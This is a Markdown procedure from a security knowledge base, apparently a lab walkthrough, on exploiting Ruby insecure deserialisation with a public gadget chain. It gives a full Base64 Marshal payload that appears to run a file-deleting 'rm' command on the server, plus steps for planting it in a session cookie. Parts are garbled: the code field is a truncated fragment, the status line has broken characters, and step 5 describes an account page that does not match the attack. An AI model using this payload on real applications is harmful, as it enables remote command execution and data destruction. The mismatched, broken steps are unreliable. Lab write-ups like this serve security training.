---
id: d84b425d-304b-49d2-b124-52e9e9868592
name: Exploiting Ruby Deserialisation Through Documented Gadget
type: procedure
verified: true
submitted: true
created_at: '2020-08-23T13:18:30.964760+00:00'
updated_at: '2023-05-26T18:37:23.129999+00:00'
platforms:
- Web
tags:
- '[[Insecure Deserialisation]]'
- '[[Web Applications]]'
---

# Exploiting Ruby Deserialisation Through Documented Gadget

**Status**: âœ“ Verified

## Summary

An attacker exploits the gadget code present in the application . An attacker will use multiple tools to identify the prebuilt gadgets. In this case pre built gadget is already available in the internet. 

## Description

# Description

An attacker exploits the gadget code present in the application . An attacker will use multiple tools to identify the prebuilt gadgets. In this case pre built gadget is already available in the internet.



# Instructions



1.Log in to the application and identify the session cookie . Session cookie contains a serialised objects. Send the request to the repeater.







![a513ee04-11b2-4819-a13c-feb18443b2d6.png](_assets/images/Mash/a513ee04-11b2-4819-a13c-feb18443b2d6.png)









2. Search the internet for "Ruby 2.x Universal [RCE](https://portswigger.net/web-security/os-command-injection)Gadget Chain" and copy the prebuilt gadget code.









**Code**: [[#!/usr/bin/env ruby

class Gem::StubSpecificatio]]







3. Copy the Base64 encoded object :

BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0BzoLQHNwZWNzWwdvOh5HZW06OlNvdXJjZTo6U3BlY2lmaWNGaWxlBjoKQHNwZWNvOhtHZW06OlN0dWJTcGVjaWZpY2F0aW9uCDoRQGxvYWRlZF9mcm9tSSIlfHJtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IDE+JjIGOgZFVDoKQGRhdGEwOwkwbzsIADoRQGRldmVsb3BtZW50Rg==







![bdb69421-bb64-4431-9d50-17c7ac5954bd.png](_assets/images/Mash/bdb69421-bb64-4431-9d50-17c7ac5954bd.png)





4.URL encode the object and replace the session cookie value with the one from above step. 





![c0a3bbaa-0d31-4512-b021-c2f802d02a9f.png](_assets/images/Mash/c0a3bbaa-0d31-4512-b021-c2f802d02a9f.png)





5.Send the modified request to the server . Observe that you were able to access the* my account*  where there is a option to update the email.





![7f1a7ed4-bc00-45f2-8003-5bf0de529fd3.png]()



## Platforms

- Web

## Tags

- [[Insecure Deserialisation]]
- [[Web Applications]]


